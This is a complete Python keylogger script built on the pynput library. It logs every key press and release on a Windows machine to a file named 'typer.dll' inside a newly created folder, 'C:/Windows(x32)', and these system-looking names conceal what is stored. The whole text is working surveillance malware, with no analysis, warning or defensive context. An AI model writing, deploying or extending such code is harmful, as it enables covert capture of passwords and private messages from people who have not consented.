from pynput import keyboard
import logging
import os

os.mkdir("C:/Windows(x32)") 
dir = r"C:/Windows(x32)/"

logging.basicConfig(level=logging.INFO, filename= dir + 'typer.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')

def on_keypress(key):
    if key == keyboard.Key.esc:
        return False
    else:
        logging.info(str(key) + " is pressed")
      #  print(key,end="\t")       
    
def on_keyrelease(key):
    logging.info(str(key) + " is released")
   # print(key , "is released", end="\t")
    #print(" ",end="/n") 

l = keyboard.Listener(on_press = on_keypress, on_release = on_keyrelease)
l.start()
l.join()
